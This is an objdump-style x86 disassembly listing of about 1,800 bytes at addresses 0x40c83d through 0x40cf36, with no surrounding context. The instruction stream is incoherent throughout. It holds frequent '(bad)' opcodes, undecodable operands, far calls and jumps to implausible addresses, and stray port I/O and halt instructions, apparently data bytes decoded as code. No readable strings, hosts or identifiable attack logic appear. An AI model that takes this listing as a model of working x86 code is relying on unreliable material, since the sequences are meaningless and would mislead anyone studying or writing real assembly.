  40c83d:	dec    eax
  40c83e:	aam    0x2e
  40c840:	cmp    al,0x10
  40c842:	fwait
  40c843:	loope  0x40c818
  40c845:	adc    DWORD PTR [eax-0x5d],esp
  40c848:	stos   BYTE PTR es:[edi],al
  40c849:	inc    ebx
  40c84a:	adc    edx,DWORD PTR [edx-0x1c]
  40c84d:	fld    QWORD PTR [edi+0x1e]
  40c850:	adc    al,0x4a
  40c852:	out    dx,al
  40c853:	mov    es,ebp
  40c855:	std    
  40c856:	or     ch,BYTE PTR [ebp+0x7510a776]
  40c85c:	and    ch,BYTE PTR ds:0xb080cc16
  40c862:	inc    ebx
  40c863:	cmp    edi,DWORD PTR [esp+ebp*8-0x6d2cf243]
  40c86a:	cwde   
  40c86b:	mov    ebp,0xc17d9f50
  40c870:	jne    0x40c876
  40c872:	data16 sbb al,0xcf
  40c875:	fimul  WORD PTR [ecx+esi*2+0x53378a49]
  40c87c:	xor    al,0xe1
  40c87e:	mov    edi,0x7521d240
  40c883:	mov    ch,0x39
  40c885:	jne    0x40c8f6
  40c887:	(bad)  
  40c888:	imul   eax,DWORD PTR [eax],0x37
  40c88b:	retf   
  40c88c:	push   0xffffffb5
  40c88e:	and    al,0x96
  40c890:	xor    DWORD PTR [ecx],0xffffffa7
  40c893:	in     eax,dx
  40c894:	jne    0x40c8f6
  40c896:	gs leave 
  40c898:	jp     0x40c88e
  40c89a:	mov    dl,0x3e
  40c89c:	repnz cmp al,0x5
  40c89f:	(bad)  
  40c8a0:	outs   dx,DWORD PTR ds:[esi]
  40c8a1:	sub    ah,ah
  40c8a3:	jae    0x40c869
  40c8a5:	test   eax,0xdce14d3a
  40c8aa:	cld    
  40c8ab:	aaa    
  40c8ac:	pusha  
  40c8ad:	dec    ebp
  40c8ae:	aam    0x54
  40c8b0:	retf   
  40c8b1:	mov    edi,0x5736f360
  40c8b6:	lods   eax,DWORD PTR ds:[esi]
  40c8b7:	daa    
  40c8b8:	enter  0x94ef,0x9c
  40c8bc:	mov    ch,0x54
  40c8be:	lods   al,BYTE PTR ds:[esi]
  40c8bf:	dec    esp
  40c8c0:	add    DWORD PTR [eax-0x60],ebp
  40c8c3:	bswap  esi
  40c8c5:	adc    eax,0x1b88c73b
  40c8ca:	sahf   
  40c8cb:	lock cmp eax,DWORD PTR [ebx-0x6790919a]
  40c8d2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c8d3:	mov    ebx,0x6729051e
  40c8d8:	jcxz   0x40c8f2
  40c8db:	mov    ch,0xc4
  40c8dd:	(bad)  
  40c8de:	retf   0x70c5
  40c8e1:	in     eax,dx
  40c8e2:	not    DWORD PTR [edx+0x49]
  40c8e5:	sbb    DWORD PTR [ebx+eiz*4],ebp
  40c8e8:	xor    eax,0x96ff098d
  40c8ed:	fisttp DWORD PTR [edx]
  40c8ef:	ret    0xef8
  40c8f2:	(bad)  
  40c8f3:	das    
  40c8f4:	in     eax,dx
  40c8f5:	retf   
  40c8f6:	(bad)  
  40c8f7:	pop    esp
  40c8f8:	stos   DWORD PTR es:[edi],eax
  40c8f9:	fcomip st,st(5)
  40c8fb:	in     eax,dx
  40c8fc:	cs aam 0x8a
  40c8ff:	sbb    eax,0x726092ee
  40c904:	or     edx,ecx
  40c906:	fimul  WORD PTR [eax]
  40c908:	js     0x40c955
  40c90a:	daa    
  40c90b:	adc    edx,esp
  40c90d:	jo     0x40c895
  40c90f:	aas    
  40c910:	(bad)  
  40c911:	xchg   esp,eax
  40c912:	scas   eax,DWORD PTR es:[edi]
  40c913:	inc    ebx
  40c914:	(bad)  
  40c916:	sbb    DWORD PTR [eax-0x1ba5e209],ebx
  40c91c:	call   0x307b:0xccd7bbfc
  40c923:	repnz cmp dh,ah
  40c926:	pop    ss
  40c927:	or     ecx,DWORD PTR [ebx-0x19070580]
  40c92d:	dec    edx
  40c92e:	mov    ah,0x5e
  40c930:	mov    DWORD PTR [ebx+0x6b],esp
  40c933:	cmp    al,0x88
  40c935:	in     al,dx
  40c936:	repnz xor DWORD PTR [ebp+0x3c],edi
  40c93a:	out    0x55,al
  40c93c:	mov    bh,0x7
  40c93e:	test   DWORD PTR [edi],ebp
  40c940:	mov    ecx,eax
  40c942:	scas   eax,DWORD PTR es:[edi]
  40c943:	dec    edi
  40c944:	test   BYTE PTR [ebx-0x47f00cca],dl
  40c94a:	gs (bad) 
  40c94c:	push   esp
  40c94d:	retf   0x9139
  40c950:	and    eax,0x1a31bb68
  40c955:	inc    edi
  40c956:	test   BYTE PTR [ebx+edi*2+0x7dc63f20],ch
  40c95d:	sbb    edi,DWORD PTR [edx+edi*2+0x3693bc55]
  40c964:	ror    DWORD PTR [esi-0x2e],0xf
  40c968:	int    0x94
  40c96a:	mov    ?,WORD PTR [ebx-0x70dec259]
  40c970:	dec    esp
  40c971:	mov    edi,DWORD PTR [ebx+0x28cc579d]
  40c977:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c978:	loop   0x40c959
  40c97a:	mov    dl,0x3e
  40c97c:	pop    ds
  40c97d:	hlt    
  40c97e:	ror    BYTE PTR [edx],cl
  40c980:	sub    ah,dl
  40c982:	int    0xe8
  40c984:	mov    dh,0x3f
  40c986:	mov    ch,0xe6
  40c988:	idiv   BYTE PTR [edi]
  40c98a:	mov    ?,WORD PTR [ecx+0x1e]
  40c98d:	in     al,0xdf
  40c98f:	jo     0x40c93d
  40c991:	mov    BYTE PTR [ecx+0x71393cb1],ch
  40c997:	jo     0x40ca08
  40c999:	hlt    
  40c99a:	push   ebp
  40c99b:	inc    edx
  40c99c:	loope  0x40c921
  40c99e:	stos   BYTE PTR es:[edi],al
  40c99f:	or     eax,0x53e966fc
  40c9a4:	xor    ebx,DWORD PTR [esi]
  40c9a6:	dec    esi
  40c9a7:	mov    dh,0x66
  40c9a9:	pop    esi
  40c9aa:	push   eax
  40c9ab:	fdiv   DWORD PTR [ecx+0x4b]
  40c9ae:	les    esi,FWORD PTR [edi-0x748fa152]
  40c9b4:	add    eax,0x29294145
  40c9b9:	push   ecx
  40c9ba:	out    dx,eax
  40c9bb:	cmp    ebp,DWORD PTR [ebx+ecx*4+0x68]
  40c9bf:	mov    dl,BYTE PTR [edx]
  40c9c1:	js     0x40c94f
  40c9c3:	jno    0x40c9fa
  40c9c5:	or     BYTE PTR [ebp+0x1bbd006b],0xad
  40c9cc:	into   
  40c9cd:	sbb    eax,0x863f7541
  40c9d2:	jecxz  0x40c9ab
  40c9d4:	pop    esp
  40c9d5:	mov    dh,0x2d
  40c9d7:	in     eax,dx
  40c9d8:	and    eax,0xe86e9d95
  40c9dd:	inc    ebx
  40c9de:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c9df:	test   eax,0x99d2ae34
  40c9e4:	scas   al,BYTE PTR es:[edi]
  40c9e5:	retf   
  40c9e6:	xchg   ecx,eax
  40c9e7:	stc    
  40c9e8:	add    BYTE PTR [esi-0x3b],bl
  40c9eb:	std    
  40c9ec:	cmp    eax,0xa3bdfef8
  40c9f1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c9f2:	stc    
  40c9f3:	mov    esp,0x6e538bc9
  40c9f8:	cmp    al,0x78
  40c9fa:	xlat   BYTE PTR ds:[ebx]
  40c9fb:	xchg   esp,eax
  40c9fc:	int    0x93
  40c9fe:	sbb    bl,dl
  40ca00:	pop    ebx
  40ca01:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ca02:	mov    dl,0x59
  40ca04:	call   0x4654205e
  40ca09:	test   al,0x70
  40ca0b:	ins    DWORD PTR es:[edi],dx
  40ca0c:	or     eax,0xf87cc6f6
  40ca11:	cmp    eax,DWORD PTR [ebx+0x2091c831]
  40ca17:	xor    cl,ah
  40ca19:	fwait
  40ca1a:	stos   DWORD PTR es:[edi],eax
  40ca1b:	addr16 lahf 
  40ca1d:	add    dh,BYTE PTR [esi]
  40ca1f:	enter  0x98bf,0xaf
  40ca23:	loope  0x40c9bd
  40ca25:	cmc    
  40ca26:	add    al,0xce
  40ca28:	mov    esi,0xff015ed7
  40ca2d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ca2e:	int3   
  40ca2f:	fidivr DWORD PTR [ebx]
  40ca31:	inc    edi
  40ca32:	xchg   esp,eax
  40ca33:	jp     0x40ca85
  40ca35:	mov    dh,0x4
  40ca37:	pop    es
  40ca38:	xchg   DWORD PTR [edx+0x22],ebp
  40ca3b:	lock xchg BYTE PTR ds:0xa5bd5f05,ah
  40ca42:	scas   eax,DWORD PTR es:[edi]
  40ca43:	cmp    eax,0x43e2e284
  40ca48:	dec    ecx
  40ca49:	loopne 0x40caae
  40ca4b:	sub    bh,ch
  40ca4d:	or     eax,0x7d8262b6
  40ca52:	arpl   WORD PTR [eax],ax
  40ca54:	xchg   edi,eax
  40ca55:	xchg   esi,eax
  40ca56:	scas   al,BYTE PTR es:[edi]
  40ca57:	cdq    
  40ca58:	jp     0x40cac9
  40ca5a:	sub    ch,BYTE PTR [ebp+0x52]
  40ca5d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ca5e:	push   ds
  40ca5f:	jmp    0x40ca69
  40ca61:	or     eax,0x394ae1f8
  40ca66:	mov    ah,0x69
  40ca68:	pop    eax
  40ca69:	cld    
  40ca6a:	or     eax,0x6ed2c507
  40ca6f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ca70:	adc    ebx,DWORD PTR [esi]
  40ca72:	ins    DWORD PTR es:[edi],dx
  40ca73:	rcr    al,1
  40ca75:	xchg   ecx,eax
  40ca76:	(bad)  [esi]
  40ca78:	mov    ebx,0xfc8da03b
  40ca7d:	sub    al,0xdc
  40ca7f:	mov    edi,0x4754d376
  40ca84:	ss daa 
  40ca86:	adc    ah,0x7
  40ca89:	xchg   ebp,eax
  40ca8a:	aas    
  40ca8b:	daa    
  40ca8c:	(bad)  
  40ca8d:	xchg   ebx,eax
  40ca8e:	shl    DWORD PTR [edi-0x3306513],1
  40ca94:	jmp    0xfcb6e256
  40ca99:	push   0x55
  40ca9b:	icebp  
  40ca9c:	pop    ebx
  40ca9d:	popf   
  40ca9e:	mov    bh,0xdd
  40caa0:	mov    ebx,es
  40caa2:	enter  0x33fc,0x31
  40caa6:	arpl   WORD PTR [ebx+0xe331552],ax
  40caac:	scas   al,BYTE PTR es:[edi]
  40caad:	rcl    eax,1
  40caaf:	sub    ebx,DWORD PTR [ecx-0x9]
  40cab2:	or     BYTE PTR [esi-0x7a],cl
  40cab5:	mov    BYTE PTR [edi-0x13d5ef74],0xe0
  40cabc:	ins    BYTE PTR es:[edi],dx
  40cabd:	fistp  WORD PTR [esi+0x30]
  40cac0:	mov    esi,0x4d46d189
  40cac5:	cmp    al,0xa2
  40cac7:	jle    0x40cb1d
  40cac9:	aas    
  40caca:	cdq    
  40cacb:	cmp    ecx,DWORD PTR [edx-0x18]
  40cace:	sub    BYTE PTR [edx+0x4a],cl
  40cad1:	xor    eax,0x7ad5e8c6
  40cad6:	inc    edx
  40cad7:	lahf   
  40cad8:	mov    bh,0x2e
  40cada:	loop   0x40cacf
  40cadc:	cld    
  40cadd:	and    BYTE PTR [edx],al
  40cadf:	push   cs
  40cae0:	jno    0x40cb51
  40cae2:	hlt    
  40cae3:	jnp    0x40cadb
  40cae5:	fistp  QWORD PTR [edx-0x79b0a0d4]
  40caeb:	and    eax,0xbfb47014
  40caf0:	jno    0x40ca7a
  40caf2:	pushf  
  40caf3:	xor    ecx,DWORD PTR [ebp+0x2b]
  40caf6:	xchg   esi,eax
  40caf7:	jmp    0xf6dd:0xdb39e813
  40cafe:	dec    ebp
  40caff:	cmc    
  40cb00:	in     al,0xe1
  40cb02:	hlt    
  40cb03:	ds adc bl,dh
  40cb06:	shl    DWORD PTR [eax],0x88
  40cb09:	dec    esp
  40cb0a:	aas    
  40cb0b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40cb0c:	ret    
  40cb0d:	lea    edi,[edi+ebx*1-0x24]
  40cb11:	je     0x40ca96
  40cb13:	and    DWORD PTR [ecx+0x5c44b722],esp
  40cb19:	outs   dx,BYTE PTR ds:[esi]
  40cb1a:	stos   DWORD PTR es:[edi],eax
  40cb1b:	xchg   edx,eax
  40cb1c:	add    DWORD PTR [ebp-0x272e4b4c],eax
  40cb22:	xchg   edx,eax
  40cb23:	adc    bl,cl
  40cb25:	bound  edi,QWORD PTR [ecx+0x71e72c2f]
  40cb2b:	loop   0x40cb2e
  40cb2d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40cb2e:	push   es
  40cb2f:	mov    WORD PTR [ebp+0x31],ss
  40cb32:	mov    cl,ch
  40cb34:	dec    eax
  40cb35:	cdq    
  40cb36:	call   0x97610e18
  40cb3b:	dec    eax
  40cb3c:	fist   DWORD PTR [edi-0x1a3a6675]
  40cb42:	hlt    
  40cb43:	mov    bl,0x94
  40cb45:	xchg   edi,eax
  40cb46:	jns    0x40cb2f
  40cb48:	fistp  DWORD PTR [edx]
  40cb4a:	in     al,dx
  40cb4b:	add    ah,cl
  40cb4d:	retf   0x9a86
  40cb50:	mov    esp,0x9dfd3432
  40cb55:	jecxz  0x40cbca
  40cb57:	or     bl,dh
  40cb59:	lods   eax,DWORD PTR ds:[esi]
  40cb5a:	loop   0x40cae2
  40cb5c:	iret   
  40cb5d:	mov    DWORD PTR [edi],ecx
  40cb5f:	in     eax,dx
  40cb60:	or     al,0xec
  40cb62:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40cb63:	les    edx,FWORD PTR [ecx]
  40cb65:	leave  
  40cb66:	stos   BYTE PTR es:[edi],al
  40cb67:	push   ebx
  40cb68:	jge    0x40cb32
  40cb6a:	iret   
  40cb6b:	mov    ebx,0xbf2e763
  40cb70:	push   ebp
  40cb71:	or     eax,0x41a446dd
  40cb76:	hlt    
  40cb77:	into   
  40cb78:	pop    ss
  40cb79:	dec    ecx
  40cb7a:	pusha  
  40cb7b:	enter  0x4594,0x69
  40cb7f:	adc    ah,ah
  40cb81:	loop   0x40cbd6
  40cb83:	lods   al,BYTE PTR ds:[esi]
  40cb84:	mov    bl,0x55
  40cb86:	jecxz  0x40cb2c
  40cb88:	inc    ecx
  40cb89:	imul   BYTE PTR [ecx-0x7f]
  40cb8c:	loopne 0x40cb4e
  40cb8e:	and    eax,0xa043188a
  40cb93:	mov    dl,0xdf
  40cb95:	out    dx,eax
  40cb96:	mov    cl,0x8e
  40cb98:	jmp    0x40cbe7
  40cb9a:	fiadd  DWORD PTR [edi-0x4901c040]
  40cba0:	add    eax,0x7701ad4b
  40cba5:	sub    DWORD PTR [edi+edx*2],edx
  40cba8:	dec    esp
  40cba9:	xchg   esi,eax
  40cbaa:	cmp    BYTE PTR [eax+0x60],ch
  40cbad:	jns    0x40cb56
  40cbaf:	test   eax,0x9c5b2a55
  40cbb4:	jb     0x40cb3b
  40cbb6:	(bad)  
  40cbb7:	(bad)  
  40cbb8:	pop    edi
  40cbb9:	ret    0x9170
  40cbbc:	in     eax,dx
  40cbbd:	jbe    0x40cbf8
  40cbbf:	(bad)  
  40cbc0:	mov    ebx,0xe6a68a37
  40cbc5:	jle    0x40cb8d
  40cbc7:	add    eax,0xdcf5aa18
  40cbcc:	xor    ebp,DWORD PTR [edx-0x13]
  40cbcf:	arpl   WORD PTR [esi-0x17176239],bp
  40cbd5:	hlt    
  40cbd6:	daa    
  40cbd7:	or     BYTE PTR [eax],dh
  40cbd9:	mov    ch,0x3e
  40cbdb:	or     ebp,ebp
  40cbdd:	jae    0x40cc26
  40cbdf:	push   0x1e
  40cbe1:	mov    esi,esi
  40cbe3:	pop    esi
  40cbe4:	scas   al,BYTE PTR es:[edi]
  40cbe5:	les    esp,FWORD PTR [ebx-0x31a7f606]
  40cbeb:	test   DWORD PTR [esi-0x5a],esi
  40cbee:	enter  0xb7c4,0x4a
  40cbf2:	fs in  al,0x7c
  40cbf5:	scas   al,BYTE PTR es:[edi]
  40cbf6:	push   ds
  40cbf7:	pop    ss
  40cbf8:	sub    BYTE PTR [esi-0x6d],bh
  40cbfb:	lahf   
  40cbfc:	nop
  40cbfd:	inc    eax
  40cbfe:	int    0xdf
  40cc00:	mov    cl,BYTE PTR [edi-0x4fe79c55]
  40cc06:	ins    DWORD PTR es:[edi],dx
  40cc07:	sub    eax,0x1b71424d
  40cc0c:	mov    ds:0x4d866187,eax
  40cc11:	cmp    DWORD PTR [ebx],ebx
  40cc13:	cmp    DWORD PTR [ebp+0x2],esi
  40cc16:	inc    edx
  40cc17:	mov    di,0x2275
  40cc1b:	imul   edi,DWORD PTR [esi+0x119fa13b],0x5fd6445e
  40cc25:	xlat   BYTE PTR ds:[ebx]
  40cc26:	sahf   
  40cc27:	mov    ch,0x90
  40cc29:	iret   
  40cc2a:	(bad)  
  40cc2c:	jae    0x40cc09
  40cc2e:	sub    BYTE PTR [ecx-0x12e39b91],0x37
  40cc35:	inc    ebp
  40cc36:	jl     0x40cc0b
  40cc38:	cwde   
  40cc39:	mov    eax,0xfef6491b
  40cc3e:	aad    0xa2
  40cc40:	push   ebp
  40cc41:	ds pop eax
  40cc43:	add    BYTE PTR fs:[edi],ah
  40cc46:	push   eax
  40cc47:	icebp  
  40cc48:	mov    ch,0xee
  40cc4a:	rdtsc  
  40cc4c:	call   0xa281:0xbac3c41a
  40cc53:	or     BYTE PTR [ebp+0x5e],ah
  40cc56:	pop    ecx
  40cc57:	or     al,0xa9
  40cc59:	ror    ah,1
  40cc5b:	jae    0x40cc8f
  40cc5d:	sbb    al,0x87
  40cc5f:	fimul  DWORD PTR [ebp-0x1a]
  40cc62:	sbb    BYTE PTR ds:0x1fc01470,cl
  40cc68:	ret    
  40cc69:	pop    ebx
  40cc6a:	and    eax,0x5b8b5c99
  40cc6f:	sbb    dh,dh
  40cc71:	cmovo  ebp,esp
  40cc74:	mov    eax,0x1717c234
  40cc79:	mov    eax,ds:0x58652fc7
  40cc7e:	jmp    0x40cceb
  40cc80:	mov    ah,0x39
  40cc82:	out    dx,al
  40cc83:	push   edx
  40cc84:	(bad)  
  40cc85:	fist   WORD PTR [ebx-0x69befa19]
  40cc8b:	das    
  40cc8c:	bound  esi,QWORD PTR [edx]
  40cc8e:	imul   ebx,ecx,0xffffff84
  40cc91:	push   esp
  40cc92:	scas   al,BYTE PTR es:[edi]
  40cc93:	xchg   ecx,eax
  40cc94:	mov    edx,0x5ce5f57a
  40cc9a:	(bad)  
  40cc9b:	daa    
  40cc9c:	mov    dl,BYTE PTR [ebp+0x5454c2a8]
  40cca2:	pop    ss
  40cca3:	pop    ss
  40cca4:	cwde   
  40cca5:	dec    eax
  40cca6:	mov    ah,0xe3
  40cca8:	jbe    0x40ccf5
  40ccaa:	inc    edx
  40ccab:	into   
  40ccac:	fild   WORD PTR [esi+0x41d5c795]
  40ccb2:	lea    edi,[edx]
  40ccb4:	xlat   BYTE PTR ds:[ebx]
  40ccb5:	or     al,0x30
  40ccb7:	add    al,0xc4
  40ccb9:	scas   al,BYTE PTR es:[edi]
  40ccba:	cmp    BYTE PTR [ebx],0xa
  40ccbd:	cwde   
  40ccbe:	jns    0x40cd38
  40ccc0:	jl     0x40cd32
  40ccc2:	xchg   ecx,eax
  40ccc3:	aas    
  40ccc4:	pop    ebp
  40ccc5:	inc    edx
  40ccc6:	sub    esi,eax
  40ccc8:	inc    eax
  40ccc9:	addr16 push ecx
  40cccb:	dec    edi
  40cccc:	sbb    BYTE PTR [edx-0x48],dh
  40cccf:	or     eax,0xd8ee2156
  40ccd4:	scas   eax,DWORD PTR es:[edi]
  40ccd5:	mov    bh,0x86
  40ccd7:	push   cs
  40ccd8:	sub    bh,BYTE PTR [ebx+eiz*2]
  40ccdb:	dec    ebp
  40ccdc:	int    0xd0
  40ccde:	jno    0x40ccd3
  40cce0:	push   ds
  40cce1:	push   esp
  40cce2:	sub    eax,0x4e978398
  40cce7:	out    dx,eax
  40cce8:	cld    
  40cce9:	mov    esp,0x8904dba3
  40ccee:	sbb    eax,0x6c758850
  40ccf3:	push   ebp
  40ccf4:	jle    0x40cd37
  40ccf6:	sbb    edx,DWORD PTR [edi+edi*2+0x75c2bf9a]
  40ccfd:	ins    BYTE PTR es:[edi],dx
  40ccfe:	addr16 dec edi
  40cd00:	push   0xffffffed
  40cd02:	enter  0x8bd8,0xe2
  40cd06:	inc    ax
  40cd08:	xchg   ebx,eax
  40cd09:	clc    
  40cd0a:	outs   dx,DWORD PTR ds:[esi]
  40cd0b:	push   eax
  40cd0c:	dec    ebx
  40cd0d:	inc    edx
  40cd0e:	add    esi,edx
  40cd10:	sub    al,0xfe
  40cd12:	mov    eax,0x68a3aa0b
  40cd17:	mov    ebp,0x1cc152a7
  40cd1c:	xchg   edx,eax
  40cd1d:	test   DWORD PTR [edx-0x28],edx
  40cd20:	xor    ch,0xfc
  40cd23:	sbb    bh,BYTE PTR [ebp+0x53]
  40cd26:	mov    ah,0x66
  40cd28:	mov    bh,0xd9
  40cd2a:	xchg   BYTE PTR [ecx],ah
  40cd2c:	push   ebx
  40cd2d:	adc    DWORD PTR [ecx+0x631caa96],0xcb7576c2
  40cd37:	sub    bh,BYTE PTR [edi+0x41]
  40cd3a:	rol    DWORD PTR [esi],cl
  40cd3c:	xchg   ebx,eax
  40cd3d:	mov    cl,0x82
  40cd3f:	dec    ecx
  40cd40:	xchg   ecx,eax
  40cd41:	leave  
  40cd42:	jno    0x40cd0e
  40cd44:	lds    ebx,FWORD PTR [ecx+0x3756b8a6]
  40cd4a:	rcr    ch,0x8
  40cd4d:	(bad)  
  40cd4e:	fld    TBYTE PTR [ebx-0x2b]
  40cd51:	rol    ch,0xb2
  40cd54:	outs   dx,DWORD PTR ds:[esi]
  40cd55:	pop    ss
  40cd56:	stos   DWORD PTR es:[edi],eax
  40cd57:	out    0x28,eax
  40cd59:	dec    edx
  40cd5a:	out    0x65,eax
  40cd5c:	das    
  40cd5d:	jp     0x40cd5f
  40cd5f:	in     eax,0xf4
  40cd61:	ds fldz 
  40cd64:	icebp  
  40cd65:	test   DWORD PTR [esi-0x79b108d4],ebx
  40cd6b:	mov    esi,eax
  40cd6d:	push   edx
  40cd6e:	and    esp,eax
  40cd70:	xchg   DWORD PTR [edi+eiz*8-0x4b],ecx
  40cd74:	or     al,0x48
  40cd76:	jnp    0x40cd07
  40cd78:	std    
  40cd79:	mov    eax,0xf6051934
  40cd7e:	outs   dx,DWORD PTR ds:[esi]
  40cd7f:	scas   al,BYTE PTR es:[edi]
  40cd80:	jnp    0x40cd0e
  40cd82:	out    0xec,al
  40cd84:	shr    edi,0xad
  40cd87:	add    DWORD PTR [eax+0x38],ebx
  40cd8a:	arpl   WORD PTR [ecx+eiz*4-0x26],si
  40cd8e:	es push esi
  40cd90:	sar    BYTE PTR [edi+0x1f],cl
  40cd93:	and    dl,BYTE PTR [ecx-0x2f449b32]
  40cd99:	and    esp,DWORD PTR [esi+0x4c]
  40cd9c:	ret    0x51bc
  40cd9f:	pop    es
  40cda0:	cmp    bl,bl
  40cda2:	std    
  40cda3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40cda4:	xchg   edi,eax
  40cda5:	out    dx,eax
  40cda6:	rcr    al,1
  40cda8:	dec    BYTE PTR [edi-0x75]
  40cdab:	pop    ecx
  40cdac:	mov    dh,0x1c
  40cdae:	fdivr  DWORD PTR [ecx]
  40cdb0:	stos   DWORD PTR es:[edi],eax
  40cdb1:	or     ebp,esi
  40cdb3:	inc    eax
  40cdb4:	aaa    
  40cdb5:	repnz mov ebx,0xe1a00529
  40cdbb:	mov    DWORD PTR [eax-0x702b48b9],esi
  40cdc1:	sti    
  40cdc2:	sub    al,0x73
  40cdc4:	repz jg 0x40cddd
  40cdc7:	mov    ah,0x89
  40cdc9:	retf   0x8ee6
  40cdcc:	bnd jo 0x40ce2b
  40cdcf:	mov    ebp,0x8c84f85d
  40cdd4:	jmp    0x84c85f18
  40cdd9:	xor    BYTE PTR [esi],bh
  40cddb:	imul   BYTE PTR [edi+0x13]
  40cdde:	mov    ebx,0x89b74847
  40cde3:	out    0xef,al
  40cde5:	mov    eax,ds:0x2b43352c
  40cdea:	push   0x29bfeb58
  40cdef:	inc    ebp
  40cdf0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40cdf1:	push   esi
  40cdf2:	mov    ecx,0x4f357f4f
  40cdf7:	jno    0x40ce0c
  40cdf9:	icebp  
  40cdfa:	xlat   BYTE PTR ds:[ebx]
  40cdfb:	xchg   ebx,eax
  40cdfc:	hlt    
  40cdfd:	mov    ecx,0x6107f66f
  40ce02:	xchg   edx,eax
  40ce03:	loopne 0x40ce58
  40ce05:	stos   BYTE PTR es:[edi],al
  40ce06:	and    eax,0x6ab0f623
  40ce0b:	push   ebp
  40ce0c:	mov    gs,WORD PTR [ecx]
  40ce0e:	or     eax,DWORD PTR [ebx+eax*4]
  40ce11:	sub    BYTE PTR [edx+edx*8-0x7e],bl
  40ce15:	jb     0x40ce68
  40ce17:	push   esi
  40ce18:	ret    0xc4a0
  40ce1b:	jne    0x40cdb4
  40ce1d:	std    
  40ce1e:	rol    DWORD PTR [esi],cl
  40ce20:	out    0x11,eax
  40ce22:	pop    ebx
  40ce23:	jle    0x40cddc
  40ce25:	sbb    ecx,DWORD PTR [esi]
  40ce27:	push   esi
  40ce28:	das    
  40ce29:	dec    ebx
  40ce2a:	sub    ebp,edi
  40ce2c:	mov    cl,BYTE PTR [ebp+0x44b47786]
  40ce32:	int    0x7c
  40ce34:	js     0x40cdfc
  40ce36:	push   0x73ece216
  40ce3b:	mov    ah,0x6b
  40ce3d:	mov    edx,0x7576e384
  40ce42:	mov    ecx,0xf7174e09
  40ce47:	mov    ecx,0x226bf699
  40ce4c:	fs sbb al,0x99
  40ce4f:	fdivr  DWORD PTR [eax-0x583557b1]
  40ce55:	adc    eax,DWORD PTR [edi]
  40ce57:	aam    0xf3
  40ce59:	imul   esp,ebp,0xffffff96
  40ce5c:	xor    bh,bh
  40ce5e:	stc    
  40ce5f:	loopne 0x40ceb1
  40ce61:	and    ecx,ebp
  40ce63:	jecxz  0x40cdf5
  40ce65:	xchg   edx,eax
  40ce66:	jg     0x40cee7
  40ce68:	std    
  40ce69:	push   ebx
  40ce6a:	bound  ebx,QWORD PTR [ebx+0x514f8acf]
  40ce70:	hlt    
  40ce71:	jnp    0x40ce84
  40ce73:	(bad)  
  40ce74:	jb     0x40ce75
  40ce76:	ins    BYTE PTR es:[edi],dx
  40ce77:	leave  
  40ce78:	scas   eax,DWORD PTR es:[edi]
  40ce79:	pop    esi
  40ce7a:	sbb    dh,BYTE PTR [edi]
  40ce7c:	mov    ebp,0xc7fd102a
  40ce81:	push   eax
  40ce82:	inc    edx
  40ce83:	dec    eax
  40ce84:	push   cs
  40ce85:	gs jns 0x40ce49
  40ce88:	mov    DWORD PTR [edi+0x3d],0x2696fda7
  40ce8f:	pop    edi
  40ce90:	sub    ebp,ecx
  40ce92:	sub    ebx,DWORD PTR [edx+0x3]
  40ce95:	adc    BYTE PTR [esi],0x19
  40ce98:	cmp    ah,al
  40ce9a:	and    eax,0x8fea07c8
  40ce9f:	mov    al,0x59
  40cea1:	mov    ebx,DWORD PTR [edi]
  40cea3:	ret    
  40cea4:	mov    ecx,0xcbbf5288
  40cea9:	xchg   esp,eax
  40ceaa:	dec    ecx
  40ceab:	xchg   ecx,eax
  40ceac:	ds repnz adc esi,esi
  40ceb0:	rcl    DWORD PTR [edi-0x41],cl
  40ceb3:	leave  
  40ceb4:	add    DWORD PTR [ebx+0x3],esi
  40ceb7:	sti    
  40ceb8:	inc    eax
  40ceb9:	jo     0x40ceb6
  40cebb:	outs   dx,BYTE PTR ds:[esi]
  40cebc:	dec    di
  40cebe:	cli    
  40cebf:	cmp    bl,BYTE PTR [ebx+0x75]
  40cec2:	scas   eax,DWORD PTR es:[edi]
  40cec3:	bnd je 0x40ce84
  40cec6:	push   es
  40cec7:	call   0x673e:0xd52ec626
  40cece:	psubq  mm2,mm5
  40ced1:	imul   ebp,edi,0xffffffbd
  40ced4:	rol    DWORD PTR [eax-0x2],0x55
  40ced8:	push   ebx
  40ced9:	xchg   esp,eax
  40ceda:	ds call 0x473ba1c1
  40cee0:	rcl    edx,cl
  40cee2:	push   esi
  40cee3:	(bad)  
  40cee4:	lock mov edi,0x8d75f61b
  40ceea:	stc    
  40ceeb:	scas   al,BYTE PTR es:[edi]
  40ceec:	je     0x40cf14
  40ceee:	xor    bh,BYTE PTR [edx+eiz*8+0x45d74384]
  40cef5:	push   ebp
  40cef6:	(bad)  
  40cef7:	dec    esp
  40cef8:	mov    ch,0x7
  40cefa:	and    al,0x32
  40cefc:	test   al,0x9
  40cefe:	jnp    0x40ceb8
  40cf00:	add    cl,BYTE PTR [eax+0x78]
  40cf03:	inc    esp
  40cf04:	jmp    0x7315429d
  40cf09:	or     al,0x8b
  40cf0b:	push   ebx
  40cf0c:	push   ecx
  40cf0d:	ret    0xb738
  40cf10:	mov    al,0x46
  40cf12:	dec    ebx
  40cf13:	mov    cl,0x59
  40cf15:	jmp    0xf8e2e517
  40cf1a:	xchg   edi,eax
  40cf1b:	retw   
  40cf1d:	sub    al,0x31
  40cf1f:	aad    0x84
  40cf21:	jp     0x40cf0b
  40cf23:	pushw  0x6b6
  40cf27:	outs   dx,BYTE PTR ds:[esi]
  40cf28:	pop    esp
  40cf29:	fild   DWORD PTR [ebx+0x26]
  40cf2c:	or     dh,BYTE PTR [ebp+0x1b3bab8e]
  40cf32:	push   cs
  40cf33:	outs   dx,DWORD PTR ds:[esi]
  40cf34:	shl    esp,cl
  40cf36:	in     al,0x92
